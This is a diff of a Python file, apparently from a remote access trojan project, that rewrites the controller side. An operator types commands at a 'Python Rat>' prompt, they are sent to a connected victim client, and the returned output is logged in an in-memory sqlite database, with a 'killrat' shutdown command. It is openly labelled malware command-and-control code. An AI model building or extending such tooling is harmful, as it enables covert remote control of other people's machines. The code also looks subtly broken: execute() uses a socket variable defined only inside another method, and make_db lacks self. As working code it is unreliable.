@@ -26,8 +26,7 @@ class SERVER:
         make_db()
             Create a sqlite3 database in memory for storing commands and results
         execute()
-        TODO
-    TODO
+            Send commands to the client when the client requests them.
     """
     def __init__(self, host, port):
         """
@@ -44,21 +43,7 @@ class SERVER:
         """
         self.host = host
         self.port = port
-    
-    def make_db(db_file):
-        """
-        Create a sqlite3 database in memory for storing commands and results
-        """
-        db = sqlite3.connect('file:rat_db?mode=memory&cache=shared') #If you wanted a local file database instead of in memory you could connect to a local database file like connect(rat_db.db)
-        cur = db.cursor()
-        cur.execute("DROP TABLE IF EXISTS COMMANDS")
-        db.commit()
-        cur.execute('''CREATE TABLE COMMANDS(TIME TEXT PRIMARY KEY, COMMAND TEXT, RESULT TEXT);''')
-        db.commit()
-        print("Table created")
-        db.close()
         
-    
     def make_connection(self):
         """
         Connect client and server.
@@ -76,22 +61,49 @@ class SERVER:
         sock.bind((self.host, self.port))
         sock.listen(0)
 
+    def make_db(db_file):
+        """
+        Create a sqlite3 database in memory for storing commands and results
+        """
+        db = sqlite3.connect('file:rat_db?mode=memory&cache=shared') #If you wanted a local file database instead of in memory you could connect to a local database file like connect(rat_db.db)
+        cur = db.cursor()
+        cur.execute("DROP TABLE IF EXISTS COMMANDS")
+        db.commit()
+        cur.execute('''CREATE TABLE COMMANDS(TIME TEXT PRIMARY KEY, COMMAND TEXT, RESULT TEXT);''')
+        db.commit()
+        print("Database created in memory")
+        db.close()
+
     def execute(self):
+        """
+        Send commands to the client when the client requests them.
+        """
         while True:
             connection, client_address = sock.accept()
+            print("Connected to client")
             while True:
-                data = connection.recv(1024)
+                data = connection.recv(1024).decode('utf-8')
                 if not data:
                     break
-                print(f"Received: {data.decode('utf-8')}")
-                db = sqlite3.connect('file:rat_db?mode=memory&cache=shared')
-                cur = db.cursor()
-                cur.execute("INSERT INTO COMMANDS(TIME, COMMAND, RESULT) VALUES (?, ?, ?)", (str(datetime.datetime.now()), "test", data.decode('utf-8)')))
-                db.commit()
-                cur.execute("SELECT TIME, COMMAND, RESULT FROM COMMANDS")
-                for row in cur:
-                    print(f"{row[0]}: {row[1]} -> {row[2]}")
-                db.close()
+                if data == "get_command": #If client sends a request for commands
+                    command = input("Python Rat>")
+                    if command == "killrat": #Killrat command closes the program
+                        connection.sendall(command.encode())
+                        print("Closing Rat")
+                        return;
+                        
+                    connection.sendall(command.encode()) #Send command
+                    
+                    result = connection.recv(1024).decode('utf-8')
+
+                    db = sqlite3.connect('file:rat_db?mode=memory&cache=shared')
+                    cur = db.cursor()
+                    cur.execute("INSERT INTO COMMANDS(TIME, COMMAND, RESULT) VALUES (?, ?, ?)", (str(datetime.datetime.now()), command, result)) #Send command and result to db
+                    db.commit()
+                    db.close()
+                    print(result)
+                    print("Saved to DB")
+                    connection.sendall("ack".encode())
 
 if __name__ == "__main__":
 
